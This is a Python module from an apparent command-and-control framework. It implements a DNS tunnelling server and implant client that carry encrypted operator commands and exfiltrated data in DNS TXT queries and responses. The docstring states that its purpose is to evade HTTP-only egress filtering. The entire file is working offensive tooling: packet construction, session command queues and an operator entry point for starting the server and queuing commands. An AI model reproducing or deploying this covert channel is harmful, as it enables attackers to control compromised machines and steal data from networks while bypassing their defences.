"""DNS tunneling — use DNS TXT/A records as an alternative C2 channel.
The implant encodes C2 data into DNS queries (A/TXT), and the DNS server
decodes responses back to the implant. Bypasses HTTP-only egress filters."""

import socket
import struct
import base64
import threading
import time
import os
import random
import string
from typing import Optional
from c2.crypto.encryption import create_cipher


class DNSTunnelServer:
    """DNS server that tunnels C2 data through TXT records.
    Responds to specially crafted DNS queries with encrypted C2 commands."""

    def __init__(self, domain: str, encryption_key: str, listen_addr: str = "0.0.0.0",
                 listen_port: int = 53):
        self.domain = domain
        self.cipher = create_cipher(encryption_key)
        self.listen_addr = listen_addr
        self.listen_port = listen_port
        self._running = False
        self._sock: Optional[socket.socket] = None
        self._pending_commands: dict[str, list[str]] = {}  # session_id -> [commands]
        self._lock = threading.Lock()

    def start(self):
        """Start the DNS tunnel server."""
        self._running = True
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.settimeout(1.0)
        self._sock.bind((self.listen_addr, self.listen_port))

        listener = threading.Thread(target=self._listen_loop, daemon=True)
        listener.start()
        print(f"DNS tunnel server listening on {self.listen_addr}:{self.listen_port}")

    def stop(self):
        self._running = False
        if self._sock:
            self._sock.close()

    def queue_command(self, session_id: str, command: str):
        """Queue a command to be sent to a specific session via DNS."""
        with self._lock:
            if session_id not in self._pending_commands:
                self._pending_commands[session_id] = []
            self._pending_commands[session_id].append(command)

    def _listen_loop(self):
        while self._running:
            try:
                data, addr = self._sock.recvfrom(1024)
                self._handle_query(data, addr)
            except socket.timeout:
                continue
            except Exception as e:
                print(f"DNS tunnel error: {e}")

    def _handle_query(self, data: bytes, addr: tuple):
        """Parse DNS query and respond with C2 data if applicable."""
        try:
            # Minimal DNS parsing: extract query name
            qname = self._extract_qname(data)
            if not qname:
                return

            # Check if this is a C2 query (subdomain of our tunnel domain)
            if qname.endswith(f".{self.domain}"):
                session_part = qname.replace(f".{self.domain}", "")
                parts = session_part.split(".")
                if len(parts) >= 2:
                    session_id = parts[0]
                    data_encoded = parts[1]
                    # Decode the data and queue it
                    try:
                        c2_data = base64.b64decode(data_encoded + "==").decode(errors="replace")
                        self._respond_with_command(session_id, data, addr)
                    except Exception:
                        self._respond_empty(data, addr)
                else:
                    self._respond_empty(data, addr)
            else:
                self._respond_empty(data, addr)

        except Exception as e:
            print(f"DNS query handling error: {e}")

    def _extract_qname(self, data: bytes) -> str:
        """Extract the query name from a DNS query packet."""
        try:
            # Skip header (12 bytes) and parse QNAME
            pos = 12
            labels = []
            while pos < len(data) and data[pos] != 0:
                length = data[pos]
                pos += 1
                if pos + length > len(data):
                    break
                labels.append(data[pos:pos+length].decode("ascii", errors="replace"))
                pos += length
            return ".".join(labels)
        except Exception:
            return ""

    def _respond_with_command(self, session_id: str, query: bytes, addr: tuple):
        """Send back a DNS TXT response with the queued command."""
        with self._lock:
            commands = self._pending_commands.get(session_id, [])
            if commands:
                cmd = commands.pop(0)
            else:
                self._respond_empty(query, addr)
                return

        # Encrypt the command
        encrypted = self.cipher.encrypt(cmd.encode())
        # Encode in base32 (DNS-safe)
        encoded = base64.b32encode(encrypted).decode()

        # Build TXT response (chunk into 255-byte labels)
        response = self._build_txt_response(query, encoded)
        if response:
            self._sock.sendto(response, addr)

    def _respond_empty(self, query: bytes, addr: tuple):
        """Send back an empty TXT response (no command pending)."""
        response = self._build_txt_response(query, "")
        if response:
            self._sock.sendto(response, addr)

    def _build_txt_response(self, query: bytes, txt_data: str) -> Optional[bytes]:
        """Build a DNS TXT response packet."""
        try:
            # Copy transaction ID from query
            tx_id = query[:2]
            flags = b"\x81\x80"  # QR=1, AA=1
            qdcount = b"\x00\x01"
            ancount = b"\x00\x01"
            nscount = b"\x00\x00"
            arcount = b"\x00\x00"

            header = tx_id + flags + qdcount + ancount + nscount + arcount

            # Copy question section from query
            question = query[12:]

            # Build answer: TXT record
            answer_name = b"\xc0\x0c"  # pointer to question name
            answer_type = b"\x00\x10"  # TXT
            answer_class = b"\x00\x01"  # IN
            ttl = b"\x00\x00\x00\x3c"  # 60 seconds

            # TXT data: length-prefixed string, chunked to 255 bytes
            txt_bytes = txt_data.encode()
            rdata_parts = []
            for i in range(0, len(txt_bytes), 255):
                chunk = txt_bytes[i:i+255]
                rdata_parts.append(bytes([len(chunk)]) + chunk)
            rdata = b"".join(rdata_parts)

            rdlength = struct.pack("!H", len(rdata))
            answer = answer_name + answer_type + answer_class + ttl + rdlength + rdata

            return header + question + answer

        except Exception:
            return None


class DNSTunnelClient:
    """DNS tunnel client — sends C2 data via DNS queries and reads responses."""

    def __init__(self, domain: str, dns_server: str = "127.0.0.1", encryption_key: str = ""):
        self.domain = domain
        self.dns_server = dns_server
        self.cipher = create_cipher(encryption_key) if encryption_key else None

    def send_data(self, session_id: str, data: str) -> Optional[str]:
        """Send data to the C2 server via DNS TXT query and return the response."""
        encoded = base64.b64encode(data.encode()).decode()
        # DNS label limit is 63 chars, so chunk the data
        chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
        query_name = f"{session_id}.{'.'.join(chunks)}.{self.domain}"

        # Send DNS TXT query
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(5.0)

            # Build minimal DNS query
            tx_id = struct.pack("!H", random.randint(0, 65535))
            flags = b"\x01\x00"  # standard query, RD=1
            qdcount = b"\x00\x01"
            header = tx_id + flags + qdcount + b"\x00\x00\x00\x00\x00\x00"

            # Encode query name as DNS labels
            qname = b""
            for label in query_name.split("."):
                qname += bytes([len(label)]) + label.encode()
            qname += b"\x00"  # root label
            qtype = b"\x00\x10"  # TXT
            qclass = b"\x00\x01"  # IN

            packet = header + qname + qtype + qclass
            sock.sendto(packet, (self.dns_server, 53))

            response, _ = sock.recvfrom(1024)
            sock.close()

            # Parse TXT response
            txt_data = self._parse_txt_response(response)
            if txt_data and self.cipher:
                try:
                    decrypted = self.cipher.decrypt(base64.b32decode(txt_data))
                    return decrypted.decode()
                except Exception:
                    return txt_data
            return txt_data

        except Exception as e:
            print(f"DNS tunnel client error: {e}")
            return None

    def _parse_txt_response(self, response: bytes) -> str:
        """Parse TXT record data from DNS response."""
        try:
            # Skip header (12 bytes) and question section
            pos = 12
            # Skip question
            while pos < len(response) and response[pos] != 0:
                pos += 1 + response[pos]
            pos += 5  # null byte + type(2) + class(2)

            # Read answer
            if pos >= len(response):
                return ""

            # Skip name pointer or name
            if response[pos] & 0xC0 == 0xC0:
                pos += 2
            else:
                while pos < len(response) and response[pos] != 0:
                    pos += 1 + response[pos]
                pos += 1

            # Read type, class, TTL, rdlength
            pos += 8  # type(2) + class(2) + ttl(4)
            rdlength = struct.unpack("!H", response[pos:pos+2])[0]
            pos += 2

            # Read RDATA (TXT: length-prefixed strings)
            rdata = response[pos:pos+rdlength]
            txt_parts = []
            rpos = 0
            while rpos < len(rdata):
                chunk_len = rdata[rpos]
                rpos += 1
                txt_parts.append(rdata[rpos:rpos+chunk_len].decode("ascii", errors="replace"))
                rpos += chunk_len

            return "".join(txt_parts)

        except Exception:
            return ""


# Module-level singletons
_dns_server: Optional[DNSTunnelServer] = None
_dns_client: Optional[DNSTunnelClient] = None


def run(args: list[str]) -> str:
    """Module entry point for DNS tunnel management.

    Usage:
        dns server start <domain> <encryption_key> [listen_addr:0.0.0.0] [listen_port:53]
        dns server stop
        dns server queue <session_id> <command>
        dns client query <domain> <encryption_key> <session_id> <data> [dns_server:127.0.0.1]
    """
    global _dns_server, _dns_client

    if not args:
        return "Usage: dns server|client"

    if args[0] == "server":
        if len(args) < 2:
            return "Usage: dns server start|stop|queue"

        if args[1] == "start":
            if len(args) < 4:
                return "Usage: dns server start <domain> <encryption_key> [listen_addr] [listen_port]"
            domain = args[2]
            key = args[3]
            listen_addr = args[4] if len(args) > 4 else "0.0.0.0"
            listen_port = int(args[5]) if len(args) > 5 else 53

            if _dns_server is not None:
                return "DNS tunnel server already running"

            _dns_server = DNSTunnelServer(domain, key, listen_addr, listen_port)
            _dns_server.start()
            return f"DNS tunnel server started: domain={domain}, listen={listen_addr}:{listen_port}"

        elif args[1] == "stop":
            if _dns_server is None:
                return "DNS tunnel server not running"
            _dns_server.stop()
            _dns_server = None
            return "DNS tunnel server stopped"

        elif args[1] == "queue":
            if len(args) < 4:
                return "Usage: dns server queue <session_id> <command>"
            if _dns_server is None:
                return "DNS tunnel server not running"
            _dns_server.queue_command(args[2], " ".join(args[3:]))
            return f"Command queued for session {args[2]}"

        else:
            return f"Unknown server command: {args[1]}"

    elif args[0] == "client":
        if len(args) < 2:
            return "Usage: dns client query|connect"

        if args[1] == "query":
            if len(args) < 6:
                return "Usage: dns client query <domain> <encryption_key> <session_id> <data> [dns_server]"
            domain = args[2]
            key = args[3]
            session_id = args[4]
            c2_data = " ".join(args[5:-1]) if len(args) > 6 else args[5]
            dns_server = args[-1] if len(args) > 6 else "127.0.0.1"

            _dns_client = DNSTunnelClient(domain, dns_server, key)
            response = _dns_client.send_data(session_id, c2_data)
            return f"DNS tunnel response: {response}" if response else "No response"

        else:
            return f"Unknown client command: {args[1]}"

    else:
        return f"Unknown command: {args[0]}"
